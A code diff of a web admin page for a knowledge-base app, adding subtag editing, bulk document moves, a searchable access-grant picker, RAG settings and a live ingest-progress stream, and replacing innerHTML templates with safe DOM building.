+      await api(`/api/kb/${curKB}/subtags/${sub.id}`, {
+        method: 'PATCH',
+        body: JSON.stringify({ name: newName }),
+      });
+      toast('Subtag renamed');
+      loadSubtags();
+    } catch (e) {
+      toast(e.message, false);
+      cancel();
+    }
+  };
+  input.addEventListener('keydown', (ev) => {
+    if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
+    else if (ev.key === 'Escape') { ev.preventDefault(); cancel(); }
+  });
+  input.addEventListener('blur', cancel);
 }
 async function createSubtag() {
   const n=document.getElementById('subtag-name').value.trim(); if(!n) return;
   try{await api(`/api/kb/${curKB}/subtags`,{method:'POST',body:JSON.stringify({name:n})}); document.getElementById('subtag-name').value=''; toast('Subtag added'); loadSubtags();}catch(e){toast(e.message,false);}
 }
-async function deleteSubtag(id) { try{await api(`/api/kb/${curKB}/subtags/${id}`,{method:'DELETE'}); toast('Deleted'); loadSubtags();}catch(e){toast(e.message,false);} }
+async function deleteSubtag(id) {
+  // M2 — confirm before destructive subtag delete; existing docs lose
+  // their subtag_id (filter falls back to the parent KB).
+  if (!confirm('Delete subtag and unassign its documents?')) return;
+  try{await api(`/api/kb/${curKB}/subtags/${id}`,{method:'DELETE'}); toast('Deleted'); loadSubtags();}catch(e){toast(e.message,false);}
+}
 
-// Documents
+// Documents — refactored for M6 (bulk select + bulk move) and to
+// support per-row in-place updates (used by H13 SSE ingest stream).
 async function loadDocs() {
+  const list = document.getElementById('doc-list');
   try {
     const docs = await api(`/api/kb/${curKB}/documents`);
-    const el = document.getElementById('doc-list');
-    if (!docs||!docs.length) { el.innerHTML='<p class="sub">No documents uploaded yet.</p>'; return; }
-    el.innerHTML = docs.map(d=>`<div class="doc-row">
-      <div><strong>${d.filename}</strong> <span class="sub">${d.mime_type||''} &middot; ${d.chunk_count} chunks &middot; ${d.ingest_status}</span></div>
-      <div class="flex gap-2">
-        <button onclick="reembed(${d.id})" class="btn btn-gray btn-sm">Re-embed</button>
-        <button onclick="deleteDoc(${d.id})" class="btn btn-red">Del</button>
-      </div>
-    </div>`).join('');
-  }catch(e){ document.getElementById('doc-list').innerHTML='<p class="sub">Could not load documents.</p>'; }
+    _docs = docs || [];
+    _selectedDocs = new Set();
+    _renderDocs();
+  } catch (e) {
+    clear(list);
+    list.appendChild(el('p', { cls: 'sub', text: 'Could not load documents.' }));
+  }
+}
+
+function _renderDocs() {
+  const list = document.getElementById('doc-list');
+  clear(list);
+  if (!_docs.length) {
+    list.appendChild(el('p', { cls: 'sub', text: 'No documents uploaded yet.' }));
+    _refreshBulkBar();
+    return;
+  }
+  for (const d of _docs) list.appendChild(_renderDocRow(d));
+  _refreshBulkBar();
+}
+
+function _renderDocRow(d) {
+  const row = el('div', { cls: 'doc-row', attrs: { 'data-doc-id': String(d.id) } });
+  // M6 — multi-select checkbox.
+  const checkLabel = el('label', { cls: 'row-check', attrs: { 'aria-label': `Select ${d.filename || ''}` } });
+  const cb = el('input', { attrs: { type: 'checkbox' } });
+  cb.checked = _selectedDocs.has(d.id);
+  cb.addEventListener('change', () => {
+    if (cb.checked) _selectedDocs.add(d.id); else _selectedDocs.delete(d.id);
+    _refreshBulkBar();
+  });
+  checkLabel.appendChild(cb);
+
+  const info = el('div');
+  const top = el('div');
+  top.appendChild(checkLabel);
+  top.appendChild(el('strong', { text: d.filename || '' }));
+  top.appendChild(el('span', {
+    cls: 'sub',
+    text: ` ${d.mime_type || ''} · ${d.chunk_count ?? 0} chunks · ${d.ingest_status || ''}`,
+  }));
+  info.appendChild(top);
+
+  // H10 — render error_message inline when status is failed.
+  // Field is added by agent C as Optional[str] on DocOut. Defensive
+  // fallback: if it's missing but status is "failed", show a generic
+  // line so the row still flags the failure (instead of silently
+  // looking like a healthy doc with 0 chunks).
+  const status = (d.ingest_status || '').toLowerCase();
+  if (status === 'failed') {
+    const err = (d.error_message != null && String(d.error_message).trim())
+      || '(no error message — check celery-worker logs)';
+    info.appendChild(el('div', { cls: 'err-line', text: err }));
+  }
+  row.appendChild(info);
+
+  // H1 — re-embed button hidden; backend route returns 501.
+  const actions = el('div', { cls: 'flex gap-2' });
+  actions.appendChild(el('button', {
+    text: 'Del',
+    cls: 'btn btn-red',
+    attrs: { 'aria-label': `Delete document ${d.filename || ''}` },
+    on: { click: () => deleteDoc(d.id) },
+  }));
+  row.appendChild(actions);
+  return row;
+}
+
+function _refreshBulkBar() {
+  const bar = document.getElementById('doc-bulk-bar');
+  const count = document.getElementById('bulk-count');
+  if (!bar || !count) return;
+  if (!_selectedDocs.size) { bar.classList.add('hidden'); return; }
+  bar.classList.remove('hidden');
+  count.textContent = `${_selectedDocs.size} selected`;
+}
+
+function clearDocSelection() {
+  _selectedDocs = new Set();
+  _renderDocs();
+}
+
+// M6 — bulk move. TODO: depends on agent C exposing
+// POST /api/kb/{kb_id}/subtags/{subtag_id}/move-docs
+// with body {"doc_ids": [...]}.
+async function bulkMoveDocs() {
+  if (!_selectedDocs.size) { toast('Select at least one document', 'warn'); return; }
+  const sub = document.getElementById('bulk-target-subtag').value;
+  if (!sub) { toast('Select a target subtag', 'warn'); return; }
+  const ids = Array.from(_selectedDocs);
+  try {
+    await api(`/api/kb/${curKB}/subtags/${sub}/move-docs`, {
+      method: 'POST',
+      body: JSON.stringify({ doc_ids: ids }),
+    });
+    toast(`Moved ${ids.length} document(s)`);
+    _selectedDocs = new Set();
+    loadDocs();
+  } catch (e) { toast(e.message, false); }
 }
 async function deleteDoc(id) {
   if(!confirm('Delete document and its vectors?')) return;
   try{await api(`/api/kb/${curKB}/documents/${id}`,{method:'DELETE'}); toast('Document deleted'); loadDocs();}catch(e){toast(e.message,false);}
-}
-async function reembed(id) {
-  try{const r=await api(`/api/kb/${curKB}/documents/${id}/reembed`,{method:'POST'}); toast(`Re-embedded: ${r.chunks} chunks`); loadDocs();}catch(e){toast(e.message,false);}
 }
 
 // Multi-file upload
@@ -224,11 +732,28 @@ function addFiles(files) {
   renderQueue();
 }
 function renderQueue() {
-  const el=document.getElementById('file-queue');
-  const act=document.getElementById('upload-actions');
-  if (!fileQueue.length) { el.innerHTML=''; act.classList.add('hidden'); return; }
+  const target = document.getElementById('file-queue');
+  const act = document.getElementById('upload-actions');
+  clear(target);
+  if (!fileQueue.length) { act.classList.add('hidden'); return; }
   act.classList.remove('hidden');
-  el.innerHTML=fileQueue.map((f,i)=>`<div class="file-item"><span>${f.name} <span class="sub">(${(f.size/1024).toFixed(1)} KB)</span></span><span onclick="removeFile(${i})" style="cursor:pointer;color:#f87171">&times;</span></div>`).join('');
+  fileQueue.forEach((f, i) => {
+    const row = el('div', { cls: 'file-item' });
+    const lhs = el('span');
+    lhs.appendChild(document.createTextNode((f.name || '') + ' '));
+    lhs.appendChild(el('span', { cls: 'sub', text: `(${(f.size/1024).toFixed(1)} KB)` }));
+    row.appendChild(lhs);
+    const x = el('span', {
+      text: '×',
+      attrs: { role: 'button', tabindex: '0', 'aria-label': `Remove ${f.name || 'file'}` },
+    });
+    x.style.cursor = 'pointer'; x.style.color = '#f87171';
+    const fire = () => removeFile(i);
+    x.addEventListener('click', fire);
+    x.addEventListener('keydown', (ev) => { if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); fire(); } });
+    row.appendChild(x);
+    target.appendChild(row);
+  });
 }
 function removeFile(i) { fileQueue.splice(i,1); renderQueue(); }
 function clearQueue() { fileQueue=[]; renderQueue(); document.getElementById('upload-files').value=''; }
@@ -251,43 +776,437 @@ async function uploadAll() {
 
 // Access
 async function loadGrants() {
+  const target = document.getElementById('grant-list');
   try {
     const g = await api(`/api/kb/${curKB}/access`);
-    const el=document.getElementById('grant-list');
-    if (!g.length) { el.innerHTML='<p class="sub">No grants. Only admins can see this KB.</p>'; return; }
-    el.innerHTML=`<table><thead><tr><th>Type</th><th>ID</th><th>Access</th><th></th></tr></thead><tbody>
-    ${g.map(x=>`<tr><td>${x.user_id?'User':'Group'}</td><td style="font-family:monospace;font-size:0.75rem">${x.user_id||x.group_id}</td>
-    <td><span class="tag">${x.access_type}</span></td><td><button onclick="revokeAccess(${x.id})" class="btn btn-red">Revoke</button></td></tr>`).join('')}</tbody></table>`;
+    clear(target);
+    if (!g.length) { target.appendChild(el('p', { cls: 'sub', text: 'No grants. Only admins can see this KB.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const headRow = el('tr');
+    for (const h of ['Type', 'ID', 'Access', '']) headRow.appendChild(el('th', { text: h }));
+    thead.appendChild(headRow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of g) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.user_id ? 'User' : 'Group' }));
+      tr.appendChild(el('td', { text: x.user_id || x.group_id || '', style: 'font-family:monospace;font-size:0.75rem' }));
+      const acc = el('td');
+      acc.appendChild(el('span', { cls: 'tag', text: x.access_type || '' }));
+      tr.appendChild(acc);
+      const actCell = el('td');
+      actCell.appendChild(el('button', {
+        text: 'Revoke',
+        cls: 'btn btn-red',
+        attrs: { 'aria-label': `Revoke grant ${x.id}` },
+        on: { click: () => revokeAccess(x.id) },
+      }));
+      tr.appendChild(actCell);
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
   }catch(e){toast(e.message,false);}
 }
 async function grantAccess() {
-  const t=document.getElementById('grant-type').value, id=document.getElementById('grant-id').value.trim();
-  if (!id) {toast('Enter an ID',false); return;}
-  const body = t==='user' ? {user_id:id} : {group_id:id};
-  try{await api(`/api/kb/${curKB}/access`,{method:'POST',body:JSON.stringify(body)}); document.getElementById('grant-id').value=''; toast('Access granted'); loadGrants();}catch(e){toast(e.message,false);}
+  const t = document.getElementById('grant-type').value;
+  const id = document.getElementById('grant-id').value.trim();
+  if (!id) { toast('Pick a target from the dropdown', false); return; }
+  const body = t === 'user' ? { user_id: id } : { group_id: id };
+  try {
+    await api(`/api/kb/${curKB}/access`, { method: 'POST', body: JSON.stringify(body) });
+    document.getElementById('grant-id').value = '';
+    document.getElementById('grant-search').value = '';
+    toast('Access granted');
+    loadGrants();
+  } catch (e) { toast(e.message, false); }
 }
 async function revokeAccess(id) { try{await api(`/api/kb/${curKB}/access/${id}`,{method:'DELETE'}); toast('Revoked'); loadGrants();}catch(e){toast(e.message,false);} }
-function toggleGrantField() { document.getElementById('grant-id').placeholder = document.getElementById('grant-type').value==='user' ? 'User UUID' : 'Group ID'; }
+
+// M3 — Grant search-and-select. Replaces the previous free-text
+// "User UUID or Group ID" input that admins had to copy-paste from
+// the user/group tables below. The dropdown filters the loaded
+// _users / _groups arrays by name/email/id; selection populates
+// the hidden #grant-id with the stable id and locks the visible
+// search input to the chosen label.
+let _grantSearchActive = -1;
+function onGrantTypeChange() {
+  document.getElementById('grant-search').placeholder =
+    document.getElementById('grant-type').value === 'user' ? 'Type to search users…' : 'Type to search groups…';
+  document.getElementById('grant-search').value = '';
+  document.getElementById('grant-id').value = '';
+  closeGrantSearchList();
+}
+function onGrantSearchInput() {
+  const q = (document.getElementById('grant-search').value || '').toLowerCase().trim();
+  const t = document.getElementById('grant-type').value;
+  const items = (t === 'user' ? _users : _groups).filter(x => {
+    const hay = `${x.name || ''}|${x.email || ''}|${x.id || ''}`.toLowerCase();
+    return !q || hay.includes(q);
+  }).slice(0, 50);
+  const list = document.getElementById('grant-search-list');
+  clear(list);
+  if (!items.length) {
+    list.appendChild(el('div', { cls: 'item sub', text: 'No matches.' }));
+  } else {
+    for (const x of items) {
+      const it = el('div', { cls: 'item', attrs: { role: 'option', 'data-id': String(x.id) } });
+      it.appendChild(el('div', { text: x.name || '(unnamed)' }));
+      const metaTxt = t === 'user'
+        ? `${x.email || ''} · ${x.id}`
+        : `id ${x.id}`;
+      it.appendChild(el('div', { cls: 'meta', text: metaTxt }));
+      it.addEventListener('mousedown', (ev) => {
+        // mousedown so the click runs before the input's blur handler
+        // collapses the list.
+        ev.preventDefault();
+        _selectGrantTarget(x);
+      });
+      list.appendChild(it);
+    }
+  }
+  list.classList.remove('hidden');
+  _grantSearchActive = -1;
+}
+function _selectGrantTarget(x) {
+  const t = document.getElementById('grant-type').value;
+  const label = t === 'user' ? `${x.name || ''} (${x.email || x.id})` : `${x.name || ''} (id ${x.id})`;
+  document.getElementById('grant-search').value = label;
+  document.getElementById('grant-id').value = String(x.id);
+  closeGrantSearchList();
+}
+function closeGrantSearchList() {
+  document.getElementById('grant-search-list').classList.add('hidden');
+}
+function onGrantSearchKey(ev) {
+  const list = document.getElementById('grant-search-list');
+  if (list.classList.contains('hidden')) return;
+  const items = list.querySelectorAll('.item:not(.sub)');
+  if (ev.key === 'ArrowDown') {
+    ev.preventDefault();
+    _grantSearchActive = Math.min(items.length - 1, _grantSearchActive + 1);
+    items.forEach((n, i) => n.classList.toggle('active', i === _grantSearchActive));
+  } else if (ev.key === 'ArrowUp') {
+    ev.preventDefault();
+    _grantSearchActive = Math.max(0, _grantSearchActive - 1);
+    items.forEach((n, i) => n.classList.toggle('active', i === _grantSearchActive));
+  } else if (ev.key === 'Enter') {
+    if (_grantSearchActive >= 0 && items[_grantSearchActive]) {
+      ev.preventDefault();
+      const id = items[_grantSearchActive].getAttribute('data-id');
+      const t = document.getElementById('grant-type').value;
+      const target = (t === 'user' ? _users : _groups).find(x => String(x.id) === id);
+      if (target) _selectGrantTarget(target);
+    }
+  } else if (ev.key === 'Escape') {
+    closeGrantSearchList();
+  }
+}
 
 // Users & Groups
-async function loadUsers() {
-  try {
-    const u=await api('/api/v1/users');
-    document.getElementById('users-list').innerHTML=u.length ? `<table><thead><tr><th>Name</th><th>Email</th><th>Role</th><th>UUID</th></tr></thead><tbody>
-    ${u.map(x=>`<tr><td>${x.name}</td><td class="sub">${x.email}</td><td><span class="tag">${x.role}</span></td><td style="font-family:monospace;font-size:0.7rem;color:#64748b">${x.id}</td></tr>`).join('')}</tbody></table>` : '<p class="sub">No users.</p>';
-  }catch(e){ document.getElementById('users-list').innerHTML='<p class="sub">Error loading.</p>'; }
-}
-async function loadGroups() {
-  try {
-    const g=await api('/api/v1/groups');
-    document.getElementById('groups-list').innerHTML=g.length ? `<table><thead><tr><th>Name</th><th>ID</th><th>Members</th></tr></thead><tbody>
-    ${g.map(x=>`<tr><td>${x.name}</td><td style="font-family:monospace;font-size:0.7rem;color:#64748b">${x.id}</td><td>${x.user_ids?.length||0}</td></tr>`).join('')}</tbody></table>` : '<p class="sub">No groups.</p>';
-  }catch(e){ document.getElementById('groups-list').innerHTML='<p class="sub">Error loading.</p>'; }
+// =============================================================
+// M5 — Per-KB rag_config "Advanced Settings"
+// =============================================================
+// Backend: GET/PATCH /api/kb/{kb_id}/config returns {kb_id, rag_config}.
+// VALID_KEYS mirrored from ext/services/kb_config.py — keep in sync
+// when the backend whitelist changes.
+const ADV_SCHEMA = [
+  // Booleans
+  { key: 'rerank',                type: 'bool', label: 'Cross-encoder rerank', help: 'Default off; production uses bge-reranker-v2-m3 on GPU 1.' },
+  { key: 'mmr',                   type: 'bool', label: 'MMR diversification' },
+  { key: 'context_expand',        type: 'bool', label: 'Context expand (siblings)' },
+  { key: 'spotlight',             type: 'bool', label: 'Spotlight wrap' },
+  { key: 'semcache',              type: 'bool', label: 'Semantic cache' },
+  { key: 'hyde',                  type: 'bool', label: 'HyDE expansion' },
+  { key: 'doc_summaries',         type: 'bool', label: 'Per-doc summaries (ingest-only)' },
+  { key: 'intent_routing',        type: 'bool', label: 'Intent routing' },
+  // Ints
+  { key: 'rerank_top_k',          type: 'int',  label: 'Rerank top-K',         min: 1,   max: 1000 },
+  { key: 'context_expand_window', type: 'int',  label: 'Expand window',        min: 0,   max: 100 },
+  { key: 'hyde_n',                type: 'int',  label: 'HyDE expansions',      min: 1,   max: 10 },
+  { key: 'chunk_tokens',          type: 'int',  label: 'Chunk tokens (ingest)', min: 100, max: 2000 },
+  { key: 'overlap_tokens',        type: 'int',  label: 'Overlap tokens (ingest)', min: 0,   max: 1000 },
+  // Floats
+  { key: 'mmr_lambda',            type: 'float', label: 'MMR λ',               min: 0,   max: 1, step: 0.05 },
+];
+
+function toggleAdvanced() {
+  const sec = document.getElementById('adv-section');
+  const arrow = document.getElementById('adv-toggle-arrow');
+  const btn = document.getElementById('adv-toggle');
+  const willOpen = sec.classList.contains('hidden');
+  sec.classList.toggle('hidden', !willOpen);
+  sec.setAttribute('aria-hidden', willOpen ? 'false' : 'true');
+  btn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
+  arrow.textContent = willOpen ? '▼' : '▶';
+  if (willOpen) loadAdvanced();
 }
 
-// Init
-if(!T){document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;min-height:100vh"><div class="card" style="text-align:center"><h2>Not Logged In</h2><p class="sub" style="margin:12px 0">Log in to Kairos first.</p><a href="/" class="btn btn-blue">Login</a></div></div>';}
-else{loadKBs();loadUsers();loadGroups();}
+function _renderAdvanced(rag_config) {
+  const grid = document.getElementById('adv-grid');
+  clear(grid);
+  for (const f of ADV_SCHEMA) {
+    const cell = el('div', { cls: 'adv-row' });
+    if (f.type === 'bool') {
+      const lbl = el('label', { cls: 'lbl-inline' });
+      const cb = el('input', { attrs: { type: 'checkbox', id: `adv-${f.key}`, 'aria-label': f.label } });
+      cb.checked = !!rag_config[f.key];
+      lbl.appendChild(cb);
+      lbl.appendChild(document.createTextNode(' ' + f.label));
+      cell.appendChild(lbl);
+      if (f.help) cell.appendChild(el('span', { cls: 'sub', text: f.help }));
+    } else if (f.type === 'int') {
+      const lbl = el('label', { text: f.label, attrs: { for: `adv-${f.key}` } });
+      cell.appendChild(lbl);
+      const inp = el('input', { attrs: { type: 'number', id: `adv-${f.key}`, min: String(f.min), max: String(f.max), step: '1' } });
+      if (rag_config[f.key] != null) inp.value = String(rag_config[f.key]);
+      cell.appendChild(inp);
+      cell.appendChild(el('span', { cls: 'sub', text: `range ${f.min}–${f.max}` }));
+    } else if (f.type === 'float') {
+      const lbl = el('label', { text: `${f.label} (${rag_config[f.key] != null ? rag_config[f.key] : '—'})`, attrs: { for: `adv-${f.key}`, id: `adv-${f.key}-lbl` } });
+      cell.appendChild(lbl);
+      const inp = el('input', { attrs: { type: 'range', id: `adv-${f.key}`, min: String(f.min), max: String(f.max), step: String(f.step || 0.05) } });
+      if (rag_config[f.key] != null) inp.value = String(rag_config[f.key]);
+      else inp.value = String(((f.min + f.max) / 2).toFixed(2));
+      inp.addEventListener('input', () => {
+        document.getElementById(`adv-${f.key}-lbl`).textContent = `${f.label} (${inp.value})`;
+      });
+      cell.appendChild(inp);
+    }
+    cell.appendChild(el('div', { cls: 'adv-err', attrs: { id: `adv-${f.key}-err` } }));
+    grid.appendChild(cell);
+  }
+}
+
+async function loadAdvanced() {
+  if (!curKB) return;
+  const status = document.getElementById('adv-status');
+  status.textContent = 'Loading…';
+  status.className = 'sub mt-2';
+  try {
+    const out = await api(`/api/kb/${curKB}/config`);
+    _renderAdvanced((out && out.rag_config) || {});
+    status.textContent = 'Loaded.';
+  } catch (e) {
+    status.textContent = `Could not load: ${e.message}`;
+    status.className = 'error mt-2';
+  }
+}
+
+function _collectAdvancedPayload() {
+  const payload = {};
+  const errors = {};
+  for (const f of ADV_SCHEMA) {
+    const ev_ = document.getElementById(`adv-${f.key}-err`);
+    if (ev_) ev_.textContent = '';
+  }
+  for (const f of ADV_SCHEMA) {
+    const inp = document.getElementById(`adv-${f.key}`);
+    if (!inp) continue;
+    if (f.type === 'bool') {
+      payload[f.key] = !!inp.checked;
+    } else if (f.type === 'int') {
+      const raw = inp.value.trim();
+      if (raw === '') continue; // unset = inherit default
+      const v = parseInt(raw, 10);
+      if (Number.isNaN(v) || v < f.min || v > f.max) {
+        errors[f.key] = `must be an integer in [${f.min}, ${f.max}]`;
+        continue;
+      }
+      payload[f.key] = v;
+    } else if (f.type === 'float') {
+      const raw = inp.value.trim();
+      if (raw === '') continue;
+      const v = parseFloat(raw);
+      if (Number.isNaN(v) || v < f.min || v > f.max) {
+        errors[f.key] = `must be a number in [${f.min}, ${f.max}]`;
+        continue;
+      }
+      payload[f.key] = v;
+    }
+  }
+  return { payload, errors };
+}
+
+async function saveAdvanced() {
+  if (!curKB) return;
+  const status = document.getElementById('adv-status');
+  status.textContent = 'Saving…';
+  status.className = 'sub mt-2';
+  const { payload, errors } = _collectAdvancedPayload();
+  if (Object.keys(errors).length) {
+    for (const [k, msg] of Object.entries(errors)) {
+      const ev_ = document.getElementById(`adv-${k}-err`);
+      if (ev_) ev_.textContent = msg;
+    }
+    status.textContent = 'Validation failed; fix highlighted fields.';
+    status.className = 'error mt-2';
+    return;
+  }
+  try {
+    const out = await api(`/api/kb/${curKB}/config`, {
+      method: 'PATCH',
+      body: JSON.stringify(payload),
+    });
+    _renderAdvanced((out && out.rag_config) || {});
+    status.textContent = 'Saved.';
+    status.className = 'success mt-2';
+    toast('Advanced settings saved');
+  } catch (e) {
+    status.textContent = `Save failed: ${e.message}`;
+    status.className = 'error mt-2';
+  }
+}
+
+// =============================================================
+// H13 — SSE ingest progress.
+// EventSource subscription to /api/kb/{id}/ingest-stream?token=…
+// Live-updates doc rows (status string + chunk_count) and surfaces
+// failures inline (cooperates with H10). Cleaned up on KB switch +
+// page unload. The SSE endpoint already exists in the backend
+// (ext/routers/ingest_stream.py); this commit consumes it.
+// =============================================================
+function _stopIngestStream() {
+  if (_ingestES) {
+    try { _ingestES.close(); } catch (_) {}
+    _ingestES = null;
+  }
+}
+
+function _startIngestStream() {
+  _stopIngestStream();
+  if (!curKB || !T) return;
+  // EventSource cannot send custom headers, so we pass the JWT in the
+  // query (admin-only endpoint, kept the surface small) — this matches
+  // the backend's ?token=… fallback at L70-75 of ingest_stream.py.
+  const url = `/api/kb/${curKB}/ingest-stream?token=${encodeURIComponent(T)}`;
+  let es;
+  try { es = new EventSource(url); } catch (_) { return; }
+  _ingestES = es;
+  es.addEventListener('ready', () => setConn('ok', 'connected'));
+  es.addEventListener('ingest', (ev) => {
+    let payload;
+    try { payload = JSON.parse(ev.data); } catch (_) { return; }
+    _onIngestEvent(payload);
+  });
+  es.addEventListener('error', () => {
+    // EventSource auto-reconnects; we surface the degraded state so
+    // an admin sees the dot flip amber instead of silently waiting.
+    setConn('degraded', 'reconnecting…');
+  });
+}
+
+function _onIngestEvent(p) {
+  if (!p || p.doc_id == null) return;
+  const idx = _docs.findIndex(d => d.id === p.doc_id);
+  if (idx >= 0) {
+    const cur = _docs[idx];
+    if (p.stage) cur.ingest_status = p.stage;
+    if (p.chunks != null) cur.chunk_count = p.chunks;
+    if (p.error) cur.error_message = p.error;   // H10 ↔ H13 cooperation
+    if (p.filename && !cur.filename) cur.filename = p.filename;
+    // Replace the matching row in place so we don't lose other rows'
+    // checkbox state.
+    const list = document.getElementById('doc-list');
+    const old = list.querySelector(`[data-doc-id="${p.doc_id}"]`);
+    const fresh = _renderDocRow(cur);
+    if (old && old.parentNode) old.parentNode.replaceChild(fresh, old);
+  } else {
+    // New doc the page hadn't yet seen — append.
+    _docs.push({
+      id: p.doc_id,
+      filename: p.filename || `doc ${p.doc_id}`,
+      ingest_status: p.stage || 'pending',
+      chunk_count: p.chunks || 0,
+      error_message: p.error || null,
+    });
+    _renderDocs();
+  }
+}
+
+window.addEventListener('beforeunload', _stopIngestStream);
+
+async function loadUsers() {
+  const target = document.getElementById('users-list');
+  try {
+    const u=await api('/api/v1/users');
+    _users = Array.isArray(u) ? u : [];   // M3 — feed the grant search
+    clear(target);
+    if (!u.length) { target.appendChild(el('p', { cls: 'sub', text: 'No users.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const hrow = el('tr');
+    for (const h of ['Name', 'Email', 'Role', 'UUID']) hrow.appendChild(el('th', { text: h }));
+    thead.appendChild(hrow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of u) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.name || '' }));
+      tr.appendChild(el('td', { cls: 'sub', text: x.email || '' }));
+      const rcell = el('td');
+      rcell.appendChild(el('span', { cls: 'tag', text: x.role || '' }));
+      tr.appendChild(rcell);
+      tr.appendChild(el('td', { text: x.id || '', style: 'font-family:monospace;font-size:0.7rem;color:#64748b' }));
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  }catch(e){
+    clear(target);
+    target.appendChild(el('p', { cls: 'sub', text: 'Error loading.' }));
+  }
+}
+async function loadGroups() {
+  const target = document.getElementById('groups-list');
+  try {
+    const g=await api('/api/v1/groups');
+    _groups = Array.isArray(g) ? g : [];   // M3 — feed the grant search
+    clear(target);
+    if (!g.length) { target.appendChild(el('p', { cls: 'sub', text: 'No groups.' })); return; }
+    const table = el('table');
+    const thead = el('thead');
+    const hrow = el('tr');
+    for (const h of ['Name', 'ID', 'Members']) hrow.appendChild(el('th', { text: h }));
+    thead.appendChild(hrow); table.appendChild(thead);
+    const tbody = el('tbody');
+    for (const x of g) {
+      const tr = el('tr');
+      tr.appendChild(el('td', { text: x.name || '' }));
+      tr.appendChild(el('td', { text: x.id || '', style: 'font-family:monospace;font-size:0.7rem;color:#64748b' }));
+      tr.appendChild(el('td', { text: String(x.user_ids ? x.user_ids.length : 0) }));
+      tbody.appendChild(tr);
+    }
+    table.appendChild(tbody);
+    target.appendChild(table);
+  }catch(e){
+    clear(target);
+    target.appendChild(el('p', { cls: 'sub', text: 'Error loading.' }));
+  }
+}
+
+// Init — C1: replace the previous innerHTML logged-out splash with
+// safe DOM construction so the body content cannot be poisoned.
+function _renderLoggedOut() {
+  const wrap = document.createElement('div');
+  wrap.style.cssText = 'display:flex;align-items:center;justify-content:center;min-height:100vh';
+  const card = document.createElement('div');
+  card.className = 'card';
+  card.style.textAlign = 'center';
+  card.appendChild(el('h2', { text: 'Not Logged In' }));
+  card.appendChild(el('p', { cls: 'sub', text: 'Log in to Kairos first.', style: 'margin:12px 0' }));
+  const a = document.createElement('a');
+  a.href = '/'; a.className = 'btn btn-blue'; a.textContent = 'Login';
+  card.appendChild(a);
+  wrap.appendChild(card);
+  document.body.innerHTML = '';
+  document.body.appendChild(wrap);
+}
+if (!T) {
+  _renderLoggedOut();
+} else {
+  setConn('degraded', 'connecting…');
+  loadKBs();loadUsers();loadGroups();
+}
 </script>
 </body>
 </html>
